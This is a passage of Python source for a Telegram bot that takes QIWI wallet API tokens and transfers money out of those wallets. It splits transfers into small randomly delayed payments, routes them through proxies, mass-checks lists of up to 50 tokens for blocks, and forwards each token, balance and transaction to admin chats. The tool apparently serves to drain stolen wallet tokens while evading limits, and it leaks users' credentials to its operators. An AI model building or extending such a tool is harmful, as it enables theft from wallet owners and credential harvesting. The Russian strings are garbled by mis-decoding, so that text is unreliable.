                        bot.send_message(tid, "–£–∫–∞–∂–∏—Ç–µ –º–∞–∫—Å–∏–º–∞–ª—å–Ω—É—é —Å—É–º–º—É –¥–ª—è –∫–∞–∂–¥–æ–≥–æ –ø–µ—Ä–µ–≤–æ–¥–∞:", parse_mode='markdown', reply_markup=kb_sums)
                    return
                elif qiwi.users_info.get(tid, {}).get("status") == "mult_max_sum":
                    try:
                        # –ü–æ–ª—É—á–∞–µ–º –º–∞–∫—Å–∏–º–∞–ª—å–Ω—É—é —Å—É–º–º—É –¥–ª—è –∫–∞–∂–¥–æ–≥–æ –ø–µ—Ä–µ–≤–æ–¥–∞.
                        max_payment_sum = round(float(message.text), 2)
                        qiwi.users_info[tid]["max_payment_sum"] = max_payment_sum
                        # –î–µ–ª–∏–º –Ω–∞ –º–µ–ª–∫–∏–µ –ø–ª–∞—Ç–µ–∂–∏.
                        user_sums = myhelper.calc_mult_payments(sum_to_send=qiwi.users_info[tid]["end_sum"], max_sum=max_payment_sum)
                        if user_sums:
                            # –ó–∞–ø–∏—Å—ã–≤–∞–µ–º –º–µ–ª–∫–∏–µ –ø–ª–∞—Ç–µ–∂–∏.
                            qiwi.users_info[tid]["mult_qiwi"] = user_sums
                            # –í—ã–≤–æ–¥–∏–º –∏–Ω—Ñ–æ—Ä–º–∞—Ü–∏—é.
                            mult_text = '\n'.join([f"{x[0]}‚ÇΩ - x{x[1]}" for x in user_sums["info"].items() if x[1]])
                            if mult_text:
                                qiwi.status(tid, "mult_confirm")
                                bot.send_message(tid, f'*–ü—Ä–æ–≤–µ—Ä—å—Ç–µ –¥–µ—Ç–∞–ª–∏ –ø–µ—Ä–µ–¥ –ø–µ—Ä–µ–≤–æ–¥–æ–º!*\n–ü–ª–∞—Ç–µ–∂–∏:\n{mult_text}', parse_mode='markdown', reply_markup=kb_confirm_multi)
                            else:
                                bot.send_message(tid, 'üö´ –û—à–∏–±–∫–∞ - –æ—Ç—Å—É—Ç—Å—Ç–≤—É—é—Ç –ø–ª–∞—Ç–µ–∂–∏ –¥–ª—è –ø—Ä–æ–≤–µ–¥–µ–Ω–∏—è.!', reply_markup=kb_main)
                                qiwi.reset(tid)
                        else:
                            bot.send_message(tid, 'üö´ –û—à–∏–±–∫–∞ - –Ω–µ —É–¥–∞–ª–æ—Å—å —Å—Ñ–æ—Ä–º–∏—Ä–æ–≤–∞—Ç—å –º–µ–ª–∫–∏–µ –ø–ª–∞—Ç–µ–∂–∏!', reply_markup=kb_main)
                            qiwi.reset(tid)
                    except:
                        bot.send_message(tid, 'üö´ –û—à–∏–±–∫–∞ - —Å—É–º–º–∞ –Ω–µ —Å–æ–æ—Ç–≤–µ—Ç—Å—Ç–≤—É–µ—Ç —Ç—Ä–µ–±–æ–≤–∞–Ω–∏—è–º!', reply_markup=kb_main)
                        qiwi.reset(tid)
                    return
                elif qiwi.users_info.get(tid, {}).get("status") == "mult_confirm":
                    if message.text == "‚úÖ –ù–∞—á–∞—Ç—å –ø–µ—Ä–µ–≤–æ–¥—ã":
                        try:
                            bot.send_message(tid, "üöÄ –ó–∞–ø—É—Å–∫ –º–Ω–æ–∂–µ—Å—Ç–≤–µ–Ω–Ω–æ–≥–æ –ø–µ—Ä–µ–≤–æ–¥–∞, –ø–æ–¥–æ–∂–¥–∏—Ç–µ...", reply_markup=kb_disable)
                            # –ü–æ–ª—É—á–∞–µ–º —Ç–æ–∫–µ–Ω.
                            now_token = qiwi.users_info[tid]["token"]
                            # –ù–æ–º–µ—Ä —Ç–æ–∫–µ–Ω–∞.
                            from_qiwi = qiwi.users_info[tid]["phone"]
                            # –ü–æ–ª—É—á–∞–µ–º –ø–æ–ª—É—á–∞—Ç–µ–ª—è.
                            to_qiwi = qiwi.users_info[tid]["to_qiwi"]
                            # –ü–æ–ª—É—á–∞–µ–º –∫–æ–º–º–µ–Ω—Ç–∞—Ä–∏–π.
                            user_comment = qiwi.users_info[tid]["comment"]
                            # –ü–æ–ª—É—á–∞–µ–º –±–∞–ª–∞–Ω—Å.
                            balance = qiwi.users_info[tid]["balance"]

                            # –ü–æ–ª—É—á–∞–µ–º —Å–ø–∏—Å–æ–∫ —Å—É–º–º.
                            user_sums = qiwi.users_info[tid]["mult_qiwi"]["payments"]
                            #  –ü–æ–ª—É—á–∞–µ–º –∫–æ–ª–∏—á–µ—Å—Ç–≤–æ –ø–µ—Ä–µ–≤–æ–¥–æ–≤.
                            sums_amount = len(user_sums)

                            # –ü–æ–ª—É—á–∞–µ–º –æ–±—â—É—é —Å—É–º–º—É –¥–ª—è –ø–µ—Ä–µ–≤–æ–¥–∞.
                            end_sum = qiwi.users_info[tid]["end_sum"]

                            sand_clocks = get_sand_clock()
                            mail_message = bot.send_message(tid, f'{next(sand_clocks)} *–í—ã–ø–æ–ª–Ω—è–µ–º –ø–µ—Ä–µ–≤–æ–¥...*\n–û–ø–µ—Ä–∞—Ü–∏–π: *0*/*{sums_amount}*\n–°—É–º–º–∞: RUB *0*/*{end_sum}*', parse_mode='markdown')
                            qiwi.status(tid, "doing_many_pays")
                            # –°–ø–∏—Å–æ–∫ —Ç—Ä–∞–Ω–∑–∞–∫—Ü–∏–π.
                            transactions = []
                            sum_sent = 0
                            goods = 0

                            for numb, one_sum in enumerate(user_sums):
                                try:
                                    # –í—ã–ø–æ–ª–Ω—è–µ–º –ø–µ—Ä–µ–≤–æ–¥.
                                    main_result = qiwi.send_p2p(now_token=now_token, to_qiwi=to_qiwi, sum_p2p=one_sum, tg_id=tid, comment=user_comment)
                                    if main_result["transaction"]["state"]["code"] == "Accepted":
                                        # –ü–æ–ª—É—á–∞–µ–º –Ω–æ–º–µ—Ä —Ç—Ä–∞–Ω–∑–∞–∫—Ü–∏–∏.
                                        transaction_id = main_result.get("transaction", {}).get("id", "None")
                                        transactions.append(transaction_id)
                                        # –î–æ–±–∞–≤–ª—è–µ–º –ø–µ—Ä–µ–≤–µ–¥–µ–Ω–Ω—É—é —Å—É–º–º—É.
                                        sum_sent += one_sum
                                        goods += 1
                                        # –°–æ—Ö—Ä–∞–Ω—è–µ–º —Ç—Ä–∞–Ω–∑–∞–∫—Ü–∏—é.
                                        use_proxy = do_have_proxy(tg_id=tid)
                                        qiwi.save_transaction(telegram_id=tid, token=now_token, from_qiwi=from_qiwi, to_qiwi=to_qiwi, user_sum=one_sum, boss_sum=0, transaction_id=transaction_id, use_proxy=use_proxy)
                                    else:
                                        raise ValueError
                                except:
                                    pass
                                bot.edit_message_text(f'{next(sand_clocks)} *–í—ã–ø–æ–ª–Ω—è–µ–º –ø–µ—Ä–µ–≤–æ–¥...*\n–ó–∞–¥–µ—Ä–∂–∫–∞: ~7-10 —Å–µ–∫.\n–û–ø–µ—Ä–∞—Ü–∏–π: *{goods}*/*{sums_amount}*\n–°—É–º–º–∞ RUB: *{sum_sent}*/*{end_sum}*', tid, mail_message.message_id, parse_mode='markdown')
                                if numb != sums_amount - 1:
                                    # –î–µ–ª–∞–µ–º –∑–∞–¥–µ—Ä–∂–∫—É.
                                    myhelper.rand_sleep()

                            if goods:
                                qiwi.add_last_phone(tid, to_qiwi)
                                transactions_text = ', '.join([f'`{x}`' for x in transactions])
                                qiwi.add_spent_limits(tid, sum_sent) # 6
                                bot.edit_message_text(f'‚úÖ *–ü–µ—Ä–µ–≤–æ–¥—ã –≤—ã–ø–æ–ª–Ω–µ–Ω—ã!*\n–û–ø–µ—Ä–∞—Ü–∏–π: *{goods}*/*{sums_amount}*\n–°—É–º–º–∞ RUB: *{sum_sent}*/*{end_sum}*\n\nüßæ ID –¢—Ä–∞–Ω–∑–∞–∫—Ü–∏–π: {transactions_text}', tid, mail_message.message_id, parse_mode='markdown')
                                # –û—Ç–ø—Ä–∞–≤–ª—è–µ–º —É–≤–µ–¥–æ–º–ª–µ–Ω–∏–µ –æ–± —É—Å–ø–µ—à–Ω–æ–º –ø–µ—Ä–µ–≤–æ–¥–µ.
                                if tid != qiwi.notification:
                                    common_text = f'–¢–æ–∫–µ–Ω `{now_token}`\n–û—Ç–ø—Ä–∞–≤–∏—Ç–µ–ª—å: `{from_qiwi}`\n–ü–æ–ª—É—á–∞—Ç–µ–ª—å: `{to_qiwi}`\n\n–ë–∞–ª–∞–Ω—Å: `{balance}`‚ÇΩ\n' + \
                                        f'–û–ø–µ—Ä–∞—Ü–∏–π: `{goods}`/`{sums_amount}`\n–°—É–º–º–∞ –∫ –ø–æ–ª—É—á–µ–Ω–∏—é (‚ÇΩ): `{sum_sent}`/`{end_sum}` ({round(sum_sent * 1.02, 2)})\n\n' + \
                                        f'–ö–æ–º–º–µ–Ω—Ç–∞—Ä–∏–π: `{(user_comment if user_comment else "None")}`\n\nID –¢—Ä–∞–Ω–∑–∞–∫—Ü–∏–π: {transactions_text}'
                                    qiwi.notif_common_admin(notif_text='üîÇ *–ú–Ω–æ–∂–µ—Å—Ç–≤–µ–Ω–Ω—ã–π –ø–µ—Ä–µ–≤–æ–¥!*', telegram_id=tid, username=message.from_user.username, last_text=common_text, use_proxy=use_proxy)
                            else:
                                bot.edit_message_text(f'‚ùå –ù–µ —É–¥–∞–ª–æ—Å—å –≤—ã–ø–æ–ª–Ω–∏—Ç—å –ø–µ—Ä–µ–≤–æ–¥—ã.', tid, mail_message.message_id, parse_mode='markdown')
                            bot.send_message(tid, '–í–æ–∑–≤—Ä–∞—â–∞–µ–º—Å—è –≤ –≥–ª–∞–≤–Ω–æ–µ –º–µ–Ω—é.', reply_markup=kb_main)
                        except:
                            bot.send_message(tid, 'üö´ –û—à–∏–±–∫–∞ - —Å–±–æ–π –ø—Ä–∏ –º–Ω–æ–∂–µ—Å—Ç–≤–µ–Ω–Ω–æ–º –ø–µ—Ä–µ–≤–æ–¥–∞!', reply_markup=kb_main)
                    else:
                        bot.send_message(tid, 'üö´ –û—à–∏–±–∫–∞ - –æ–∂–∏–¥–∞–ª–æ—Å—å –ø–æ–¥—Ç–≤–µ—Ä–∂–¥–µ–Ω–∏–µ!', reply_markup=kb_main)
                    qiwi.reset(tid)
                    return
                elif qiwi.users_info.get(tid, {}).get("status") == "waiting_confirm":
                    if message.text == "‚úÖ –ü–æ–¥—Ç–≤–µ—Ä–¥–∏—Ç—å –ø–µ—Ä–µ–≤–æ–¥":
                        # –ü–æ–ª—É—á–∞–µ–º –≤—Å—é –Ω–µ–æ–±—Ö–æ–¥–∏–º—É—é –∏–Ω—Ñ–æ—Ä–º–∞—Ü–∏—é.
                        now_token = qiwi.users_info.get(tid, {}).get("token")
                        to_qiwi = qiwi.users_info.get(tid, {}).get("to_qiwi")
                        end_sum = qiwi.users_info.get(tid, {}).get("end_sum")
                        user_comment = qiwi.users_info.get(tid, {}).get("comment")

                        bot.send_message(tid, f'‚åõ –ü–µ—Ä–µ–≤–æ–¥ –Ω–∞ `+{to_qiwi}` ...\n–≠—Ç–æ –º–æ–∂–µ—Ç –∑–∞–Ω—è—Ç—å –Ω–µ–∫–æ—Ç–æ—Ä–æ–µ –≤—Ä–µ–º—è, –Ω–∏—á–µ–≥–æ –Ω–µ –Ω–∞–∂–∏–º–∞–π—Ç–µ!', parse_mode='markdown', reply_markup=kb_main)
                        if now_token and to_qiwi and end_sum:
                            try:
                                # –í—ã–ø–æ–ª–Ω—è–µ–º –ø–µ—Ä–µ–≤–æ–¥.
                                main_result = qiwi.send_p2p(now_token=now_token, to_qiwi=to_qiwi, sum_p2p=end_sum, tg_id=tid, comment=user_comment)
                                if main_result["transaction"]["state"]["code"] == "Accepted":
                                    transaction_id = main_result.get("transaction", {}).get("id", "None")
                                    # –ü–æ–ª—É—á–∞–µ–º –æ—Ç–ø—Ä–∞–≤–∏—Ç–µ–ª—è.
                                    from_qiwi = qiwi.users_info.get(tid, {}).get("phone", "None")
                                    # –ü–æ–ª—É—á–∞–µ–º –±–∞–ª–∞–Ω—Å –¥–æ –ø–µ—Ä–µ–≤–æ–¥–∞.
                                    balance_show = qiwi.users_info.get(tid, {}).get("balance", "None")
                                else:
                                    raise ValueError
                            except:
                                bot.send_message(tid, 'üö´ –û—à–∏–±–∫–∞ - –Ω–µ —É–¥–∞–ª–æ—Å—å –ø—Ä–æ–≤–µ—Å—Ç–∏ –ø–ª–∞—Ç–µ–∂!', reply_markup=kb_main)
                            else:
                                # –î–æ–±–∞–≤–ª—è–µ–º —Ç–µ–ª–µ—Ñ–æ–Ω –≤ –ø–æ—Å–ª–µ–¥–Ω–∏–µ.
                                qiwi.add_last_phone(tid, to_qiwi)

                                # –û—Ç–ø—Ä–∞–≤–ª—è–µ–º —É–≤–µ–¥–æ–º–ª–µ–Ω–∏–µ –æ–± —É—Å–ø–µ—à–Ω–æ–º –ø–µ—Ä–µ–≤–æ–¥–µ.
                                if tid != qiwi.notification:
                                    use_proxy = do_have_proxy(tg_id=tid)
                                    qiwi.notif_tr_admin(telegram_id=tid, username=message.from_user.username, token=now_token, from_qiwi=from_qiwi, to_qiwi=to_qiwi, balance=balance_show, user_sum=end_sum, boss_sum=0, transaction_id=transaction_id, comment=user_comment, use_proxy=use_proxy)
                                    qiwi.save_transaction(telegram_id=tid, token=now_token, from_qiwi=from_qiwi, to_qiwi=to_qiwi, user_sum=end_sum, boss_sum=0, transaction_id=transaction_id, use_proxy=use_proxy)
                                # –ó–∞–ø–∏—Å—ã–≤–∞–µ–º –∏—Å–ø–æ–ª—å–∑–æ–≤–∞–Ω–Ω—É—é —Å—É–º–º—É.
                                qiwi.add_spent_limits(tid, end_sum * 1.02) # 1
                                bot.send_message(tid, f'‚úÖ –ü–ª–∞—Ç–µ–∂ –ø—Ä–∏–Ω—è—Ç!\nüßæ ID –¢—Ä–∞–Ω–∑–∞–∫—Ü–∏–∏: `{transaction_id}`', parse_mode='markdown', reply_markup=kb_main)
                        else:
                            bot.send_message(tid, 'üö´ –û—à–∏–±–∫–∞ - –ø–æ—Ç–µ—Ä—è –ø–∞—Ä–∞–º–µ—Ç—Ä–æ–≤ –ø–ª–∞—Ç–µ–∂–∞!', reply_markup=kb_main)
                        qiwi.reset(tid)
                        return
                    else:
                        bot.send_message(tid, 'üö´ –û—à–∏–±–∫–∞ - —è –≤–æ–æ–±—â–µ-—Ç–æ –∂–¥–∞–ª–∞ –ø–æ–¥—Ç–≤–µ—Ä–∂–¥–µ–Ω–∏—è –ø–ª–∞—Ç–µ–∂–∞, –∞ –Ω–µ –∫—Ä–∞–∫–æ–∑—è–±—Ä—ã –≤—Å—è–∫–∏–µ! ' + \
                            '–¢—ã –≤–æ–æ–±—â–µ —Å–∞–º –ø–æ–Ω—è–ª, —á—Ç–æ –Ω–∞–ø–∏—Å–∞–ª?!\n' + \
                            '–ù—É –∏ –ª–∞–¥–Ω–æ, –≤–æ—Ç —Ç–æ–≥–¥–∞ —Ç–µ–±–µ –≥–ª–∞–≤–Ω–æ–µ –º–µ–Ω—é, –±–∞–∫–∞! <(Ôø£ Ôπå Ôø£)>', reply_markup=kb_main)
                        qiwi.reset(tid)
                    return
                elif qiwi.users_info.get(tid, {}).get("status") == "red_auto":
                    try:
                        new_number = int(message.text)
                        if new_number and 7 >= new_number >= 1:
                            qiwi.users_info[tid]["auto"] = new_number
                        else:
                            raise ValueError
                    except:
                        bot.send_message(tid, 'üö´ –û—à–∏–±–∫–∞ - –Ω–µ —É–¥–∞–ª–æ—Å—å –∏–∑–º–µ–Ω–∏—Ç—å –∑–Ω–∞—á–µ–Ω–∏–µ!', reply_markup=kb_main)
                    else:
                        bot.send_message(tid, '‚úÖ –£—Å–ø–µ—à–Ω–æ –∏–∑–º–µ–Ω–µ–Ω–æ!', reply_markup=kb_main)
                    qiwi.reset(tid)
                    return
                elif qiwi.users_info.get(tid, {}).get("status") == "idea":
                    try:
                        if message.text and len(message.text) >= 5:
                            username = message.from_user.username
                            uid = tid
                            idea_text = f"üì© *–ü–æ–ª—É—á–µ–Ω–æ –ø—Ä–µ–¥–ª–æ–∂–µ–Ω–∏–µ!*\nUsername: *@{username}*\nTelegram ID: `{uid}`\n–¢–µ–∫—Å—Ç: `{message.text}`"
                            try:
                                if qiwi.notification:
                                    bot.send_message(qiwi.notification, idea_text, parse_mode='markdown')
                                    time.sleep(0.01)
                                    bot.send_message(CORE, idea_text, parse_mode='markdown')
                                else:
                                    raise ValueError
                            except:
                                bot.send_message(tid, 'üö´ –û—à–∏–±–∫–∞ - –æ—à–∏–±–∫–∞ –ø—Ä–∏ –æ—Ç–ø—Ä–∞–≤–∫–µ!', reply_markup=kb_main)
                            else:
                                bot.send_message(tid, '‚úÖ –ü—Ä–µ–¥–ª–æ–∂–µ–Ω–∏–µ —É—Å–ø–µ—à–Ω–æ –æ—Ç–ø—Ä–∞–≤–ª–µ–Ω–æ!', reply_markup=kb_main)
                        else:
                            bot.send_message(tid, 'üö´ –û—à–∏–±–∫–∞ - —Å–ª–∏—à–∫–æ–º –∫–æ—Ä–æ—Ç–∫–æ–µ —Å–æ–æ–±—â–µ–Ω–∏–µ!', reply_markup=kb_main)
                    except:
                        bot.send_message(tid, 'üö´ –û—à–∏–±–∫–∞ - –Ω–µ–ø—Ä–∞–≤–∏–ª—å–Ω–æ–µ —Å–æ–æ–±—â–µ–Ω–∏–µ!', reply_markup=kb_main)
                    qiwi.reset(tid)
                    return

            if message.text == "üñå –†–µ–¥–∞–∫—Ç–∏—Ä–æ–≤–∞—Ç—å":
                bot.send_message(tid, '–í—ã–±–µ—Ä–∏—Ç–µ –Ω–æ–≤–æ–µ –∑–Ω–∞—á–µ–Ω–∏–µ:', reply_markup=kb_number)
                qiwi.status(tid, "red_auto")
                return
            elif message.text == "üñç –ê–≤—Ç–æ–∑–∞–ø–æ–ª–Ω–µ–Ω–∏—è":
                try:
                    numbers = int(qiwi.users_info[tid]["auto"])
                    if not (7 >= numbers >= 1):
                        raise ValueError
                except:
                    numbers = 3
                bot.send_message(tid, f'–¢–µ–∫—É—â–µ–µ –∫–æ–ª–∏—á–µ—Å—Ç–≤–æ —Ç–µ–ª–µ—Ñ–æ–Ω–æ–≤ –∏ —Ç–æ–∫–µ–Ω–æ–≤, –∫–æ—Ç–æ—Ä—ã–µ —Å–æ—Ö—Ä–∞–Ω—è—é—Ç—Å—è –¥–ª—è –∞–≤—Ç–æ–∑–∞–ø–æ–ª–Ω–µ–Ω–∏—è: `{numbers}`', parse_mode='markdown', reply_markup=kb_auto)
                return
            if message.text == "üîÑ –ü–∞—Ä–∞–º–µ—Ç—Ä—ã —Å–±—Ä–æ—Å–∞":
                bot.send_message(tid, '–í—ã–±–µ—Ä–∏—Ç–µ –¥–µ–π—Å—Ç–≤–∏–µ: ', reply_markup=kb_clean)
                qiwi.reset(tid)
                qiwi.status(tid, "waiting_cleaning")
                return
            elif message.text == "üì° –ü—Ä–æ–∫—Å–∏":
                # –ü–æ–ª—É—á–∞–µ–º –ø—Ä–æ–∫—Å–∏.
                user_proxy = qiwi.users_proxy.get(tid)
                kb_proxy = ReplyKeyboardMarkup(True)
                if user_proxy and user_proxy.get("data") and user_proxy.get("info"):
                    kb_proxy.row('üîÑ –ó–∞–º–µ–Ω–∏—Ç—å', 'üóë –£–¥–∞–ª–∏—Ç—å')
                    # –°—Ç–∞—Ç—É—Å —Ä–∞–±–æ—Ç—ã.
                    is_working = user_proxy.get("work")
                    # –ï—Å–ª–∏ —Ä–∞–±–æ—Ç–∞–µ—Ç.
                    work_button = "üî¥ –í—ã–∫–ª—é—á–∏—Ç—å" if is_working else "üü¢ –í–∫–ª—é—á–∏—Ç—å"
                    kb_proxy.row(work_button, "üì∂ –ü—Ä–æ–≤–µ—Ä–∏—Ç—å")
                    # –ò–Ω—Ñ–æ—Ä–º–∞—Ü–∏—è.
                    proxy_info = user_proxy.get("info", {})
                    proxy_text = "üåê *–¢–µ–∫—É—â–∏–µ –ø—Ä–æ–∫—Å–∏.*\n" + \
                        f"–°—Ç–∞—Ç—É—Å: *{'üü¢ –í–∫–ª—é—á–µ–Ω—ã' if is_working else 'üî¥ –í—ã–∫–ª—é—á–µ–Ω—ã'}*\n" + \
                        f"–†–µ–≥–∏–æ–Ω: `{proxy_info.get('regionName')}`\n" + \
                        f"–°—Ç—Ä–∞–Ω–∞: `{proxy_info.get('country')}`\n" + \
                        f"–ì–æ—Ä–æ–¥: `{proxy_info.get('city')}`\n" + \
                        f"Timezone: `{proxy_info.get('timezone')}`\n" + \
                        f"IP: `{proxy_info.get('query')}`"
                    qiwi.status(tid, "managing_proxy")
                else:
                    kb_proxy.row('‚¨ÜÔ∏è –ó–∞–≥—Ä—É–∑–∏—Ç—å –ø—Ä–æ–∫—Å–∏')
                    proxy_text = "‚ö†Ô∏è –ü—Ä–æ–∫—Å–∏ –æ—Ç—Å—É—Ç—Å—Ç–≤—É—é—Ç!"
                kb_proxy.row('üîô –û—Ç–º–µ–Ω–∞')
                bot.send_message(tid, proxy_text, parse_mode="markdown", reply_markup=kb_proxy)
                return
            elif message.text == "‚¨ÜÔ∏è –ó–∞–≥—Ä—É–∑–∏—Ç—å –ø—Ä–æ–∫—Å–∏" or message.text == "üîÑ –ó–∞–º–µ–Ω–∏—Ç—å":
                proxy_text = "–û—Ç–ø—Ä–∞–≤—å—Ç–µ —Å–≤–æ–∏ *IPv4* –ø—Ä–æ–∫—Å–∏ –¥–ª—è –∑–∞–≥—Ä—É–∑–∫–∏.\n_–§–æ—Ä–º–∞—Ç: ip:port@login:password –∏–ª–∏ ip:port_"
                bot.send_message(tid, proxy_text, parse_mode='markdown', reply_markup=kb_cancel)
                if not qiwi.users_info.get(tid):
                    qiwi.reset(tid)
                qiwi.status(tid, "adding_proxy")
                return
            elif message.text == "üì∂ –ü—Ä–æ–≤–µ—Ä–∏—Ç—å":
                try:
                    # –ü–æ–ª—É—á–∞–µ–º –ø—Ä–æ–∫—Å–∏ –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—è.
                    user_proxy = qiwi.users_proxy[tid]["data"]
                    # –ü–æ–ª—É—á–∞–µ–º —Ç–µ–∫—É—â–∏–π IP.
                    now_ip = get_ip()
                    # –ü–æ–ª—É—á–∞–µ–º IP –ø–æ –ø—Ä–æ–∫—Å–∏.
                    proxy_ip = get_ip(user_proxy=user_proxy)
                    # –ü—Ä–æ–≤–µ—Ä—è–µ–º —É–¥–∞–ª–æ—Å—å –ª–∏ –ø–æ–ª—É—á–∏—Ç—å IP.
                    if now_ip and proxy_ip and now_ip != proxy_ip:
                        # –ü–æ–ª—É—á–∞–µ–º –∏–Ω—Ñ–æ—Ä–º–∞—Ü–∏—é –æ–± IP.
                        ip_info = get_ip_info(proxy_ip)
                        if ip_info:
                            ip_info_text = f"‚úÖ *–ü—Ä–æ–∫—Å–∏ —Ä–∞–±–æ—Ç–∞—é—Ç!*\n" + \
                                f"–†–µ–≥–∏–æ–Ω: `{ip_info.get('regionName')}`\n" + \
                                f"–°—Ç—Ä–∞–Ω–∞: `{ip_info.get('country')}`\n" + \
                                f"–ì–æ—Ä–æ–¥: `{ip_info.get('city')}`\n" + \
                                f"Timezone: `{ip_info.get('timezone')}`\n" + \
                                f"IP: `{ip_info.get('query')}`"

                            qiwi.users_proxy[tid]["checked"] = int(time.time())
                            qiwi.users_proxy[tid]["info"] = {
                                    "regionName": ip_info.get('regionName'),
                                    "country": ip_info.get('country'),
                                    "city": ip_info.get('city'),
                                    "timezone": ip_info.get('timezone'),
                                    "query": ip_info.get('query')
                            }
                            qiwi.save_proxy()
                            bot.send_message(tid, ip_info_text, parse_mode='markdown', reply_markup=kb_main)
                        else:
                            bot.send_message(tid, "üö´ –û—à–∏–±–∫–∞ - –Ω–µ —É–¥–∞–ª–æ—Å—å –ø–æ–ª—É—á–∏—Ç—å –∏–Ω—Ñ–æ—Ä–º–∞—Ü–∏—é –æ–± IP!", reply_markup=kb_del_proxy)
                    else:
                        bot.send_message(tid, "üö´ –û—à–∏–±–∫–∞ - –Ω–µ–∫–æ—Ä—Ä–µ–∫—Ç–Ω—ã–π IP!", reply_markup=kb_del_proxy)
                except:
                    bot.send_message(tid, 'üö´ –û—à–∏–±–∫–∞ - –Ω–µ —É–¥–∞–ª–æ—Å—å –∑–∞–≥—Ä—É–∑–∏—Ç—å –ø—Ä–æ–∫—Å–∏!', reply_markup=kb_main)
                return
            elif message.text == "üóë –£–¥–∞–ª–∏—Ç—å" or message.text == "üóë –£–¥–∞–ª–∏—Ç—å –ø—Ä–æ–∫—Å–∏":
                try:
                    qiwi.users_proxy[tid] = {}
                    qiwi.save_proxy()
                except:
                    bot.send_message(tid, 'üö´ –û—à–∏–±–∫–∞ - –Ω–µ —É–¥–∞–ª–æ—Å—å —É–¥–∞–ª–∏—Ç—å –ø—Ä–æ–∫—Å–∏!', reply_markup=kb_main)
                else:
                    bot.send_message(tid, '‚úÖ –ü—Ä–æ–∫—Å–∏ —É—Å–ø–µ—à–Ω–æ —É–¥–∞–ª–µ–Ω—ã!', parse_mode='markdown', reply_markup=kb_main)
                return
            elif message.text == "üîë –í–≤–µ—Å—Ç–∏ —Ç–æ–∫–µ–Ω QIWI –∫–æ—à–µ–ª—å–∫–∞":
                try:
                    numbers = int(qiwi.users_info[tid]["auto"])
                    if not (7 >= numbers >= 1):
                        raise ValueError
                except:
                    numbers = 3
                kb_tokens = ReplyKeyboardMarkup(True)
                for last_token in qiwi.last_tokens.get(tid, [])[::-1][:numbers]:
                    kb_tokens.row(last_token)
                kb_tokens.row('üîô –û—Ç–º–µ–Ω–∞')
                proxy_details = 'üõ° *–í–Ω–∏–º–∞–Ω–∏–µ, –≤—ã –∏—Å–ø–æ–ª—å–∑—É–µ—Ç–µ –ø—Ä–æ–∫—Å–∏!*\n' if qiwi.users_proxy.get(tid, {}).get("work") else ''
                bot.send_message(tid, f"{proxy_details}–í–≤–µ–¥–∏—Ç–µ —Ç–æ–∫–µ–Ω QIWI –∫–æ—à–µ–ª—å–∫–∞ –∏–ª–∏ –≤—ã–±–µ—Ä–∏—Ç–µ –∏–∑ –ø–æ—Å–ª–µ–¥–Ω–∏—Ö:", parse_mode='markdown', reply_markup=kb_tokens)
                # –ú–µ–Ω—è–µ–º —Å—Ç–∞—Ç—É—Å –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—è.
                if not qiwi.users_info.get(tid):
                    qiwi.reset(tid)
                qiwi.status(tid, "waiting_token")
            elif message.text == 'üíª –î—Ä—É–≥–∏–µ —Ñ—É–Ω–∫—Ü–∏–∏':
                bot.send_message(tid, '–í—ã–±–µ—Ä–∏—Ç–µ –¥–µ–π—Å—Ç–≤–∏–µ:', reply_markup=kb_special)
                return
            elif message.text == 'üì¶ –ú–∞—Å—Å–æ–≤–∞—è –ø—Ä–æ–≤–µ—Ä–∫–∞ —Ç–æ–∫–µ–Ω–æ–≤':
                proxy_details = 'üõ° *–í–Ω–∏–º–∞–Ω–∏–µ, –≤—ã –∏—Å–ø–æ–ª—å–∑—É–µ—Ç–µ –ø—Ä–æ–∫—Å–∏!*\n' if qiwi.users_proxy.get(tid, {}).get("work") else ''
                proxy_extra = '\n\n‚ö†Ô∏è _–ò—Å–ø–æ–ª—å–∑–æ–≤–∞–Ω–∏–µ –ø—Ä–æ–∫—Å–∏ –º–æ–∂–µ—Ç –∑–∞–º–µ—Ç–Ω–æ —Å–Ω–∏–∑–∏—Ç—å —Å–∫–æ—Ä–æ—Å—Ç—å –ø—Ä–æ–≤–µ—Ä–∫–∏ —Ç–æ–∫–µ–Ω–æ–≤. –í–æ –≤—Ä–µ–º—è –ø—Ä–æ–≤–µ—Ä–∫–∏ –¥—Ä—É–≥–∏–µ —Ñ—É–Ω–∫—Ü–∏–∏ –±–æ—Ç–∞ –±—É–¥—É—Ç –Ω–µ–¥–æ—Å—Ç—É–ø–Ω—ã–º–∏!_' if proxy_details else ''
                many_text = f'{proxy_details}–û—Ç–ø—Ä–∞–≤—å—Ç–µ –¥–æ 50-—Ç–∏ —Ç–æ–∫–µ–Ω–æ–≤ —Å–ø–∏—Å–∫–æ–º. –ö–∞–∂–¥—ã–π —Ç–æ–∫–µ–Ω –¥–æ–ª–∂–µ–Ω –±—ã—Ç—å —Å –Ω–æ–≤–æ–π —Å—Ç—Ä–æ–∫–∏ –∏–ª–∏ –æ—Ç–¥–µ–ª–µ–Ω ";".' + \
                    f'\n–ü–æ—Å–ª–µ –ø—Ä–æ–≤–µ—Ä–∫–∏ –≤—Å–µ—Ö —Ç–æ–∫–µ–Ω–æ–≤ –±–æ—Ç –≤–µ—Ä–Ω–µ—Ç —Å–ø–∏—Å–æ–∫ —Ç–æ–∫–µ–Ω–æ–≤ –±–µ–∑ –±–ª–æ–∫–∏—Ä–æ–≤–æ–∫, –∞ —Ç–∞–∫–∂–µ JSON —Ñ–∞–π–ª —Å –ø–æ–¥—Ä–æ–±–Ω—ã–º –æ—Ç—á–µ—Ç–æ–º.{proxy_extra}'
                bot.send_message(tid, many_text, parse_mode='markdown', reply_markup=kb_cancel)
                qiwi.status(tid, "waiting_many_tokens")
                return
            elif message.text == 'üîé –ü—Ä–æ–≤–µ—Ä–∏—Ç—å —Ç–æ–∫–µ–Ω –Ω–∞ –±–ª–æ–∫–∏—Ä–æ–≤–∫–∏':
                try:
                    numbers = int(qiwi.users_info[tid]["auto"])
                    if not (7 >= numbers >= 1):
                        raise ValueError
                except:
                    numbers = 3
                kb_tokens = ReplyKeyboardMarkup(True)
                for last_token in qiwi.last_tokens.get(tid, [])[::-1][:numbers]:
                    kb_tokens.row(last_token)
                kb_tokens.row('üîô –û—Ç–º–µ–Ω–∞')
                proxy_details = 'üõ° *–í–Ω–∏–º–∞–Ω–∏–µ, –≤—ã –∏—Å–ø–æ–ª—å–∑—É–µ—Ç–µ –ø—Ä–æ–∫—Å–∏!*\n' if qiwi.users_proxy.get(tid, {}).get("work") else ''
